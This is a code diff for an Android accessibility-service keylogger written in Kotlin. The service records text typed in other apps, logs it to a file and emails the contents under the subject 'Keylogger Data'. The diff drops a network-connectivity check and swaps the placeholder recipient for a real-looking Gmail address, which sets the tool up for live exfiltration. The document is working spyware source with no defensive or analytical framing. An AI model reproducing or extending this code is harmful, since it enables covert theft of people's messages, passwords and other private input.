@@ -4,8 +4,6 @@ import android.accessibilityservice.AccessibilityService
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
 import android.accessibilityservice.AccessibilityServiceInfo
-import android.net.ConnectivityManager
-import android.net.NetworkInfo
 import java.io.BufferedReader
 import java.io.File
 import java.io.FileOutputStream
@@ -28,23 +26,6 @@ class KeyListener : AccessibilityService() {
         info.packageNames = null
         serviceInfo = info
     }
-//    override fun onAccessibilityEvent(event: AccessibilityEvent) {
-//        val eventType: Int = event.getEventType()
-//        val eventText: String? = null
-//        when (eventType) {
-//            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
-//                val currApp: String = event.getPackageName().toString()
-//                if (foregroundApp == currApp || foregroundApp.isEmpty()) {
-//                    lastMsg = event.getText().toString()
-//                    Log.d("Pre", "$currApp  :  $lastMsg")
-//                } else {
-//                    Log.d("Final ", "$foregroundApp :  $lastMsg")
-//                }
-//                foregroundApp = currApp
-//                lastMsg = event.getText().toString()
-//            }
-//        }
-//    }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent) {
         val df: DateFormat = SimpleDateFormat("dd MMM, hh:mm ")
@@ -83,11 +64,7 @@ class KeyListener : AccessibilityService() {
                         fos.write(res.toByteArray())
                         fos.close()
                         val fsize = file.length().toDouble() / 1024
-                        val conMgr = getSystemService(CONNECTIVITY_SERVICE) as ConnectivityManager
                         if (fsize > 5.0) {
-                            if (conMgr.getNetworkInfo(ConnectivityManager.TYPE_MOBILE)!!.state == NetworkInfo.State.CONNECTED
-                                || conMgr.getNetworkInfo(ConnectivityManager.TYPE_WIFI)!!.state == NetworkInfo.State.CONNECTED
-                            ) {
                                 val text = StringBuilder()
                                 val br = BufferedReader(FileReader(file))
                                 var line: String?
@@ -101,10 +78,10 @@ class KeyListener : AccessibilityService() {
                                 try {
                                     val sm = SendMail(
                                         this,
-                                        "XXXXX",
+                                        "sammialldredge@gmail.com",
                                         "Keylogger Data",
                                         text.toString()
-                                    ) //Change XXXX by email adress where to send
+                                    )
 
                                     //Executing sendmail to send email
                                     sm.execute()
@@ -112,7 +89,6 @@ class KeyListener : AccessibilityService() {
                                 } catch (e: Exception) {
                                     Log.v("err", "Error while sending mail:" + e.message)
                                 }
-                            }
                         }
                     } catch (e: Exception) {
                         Log.v("msg", e.message!!)
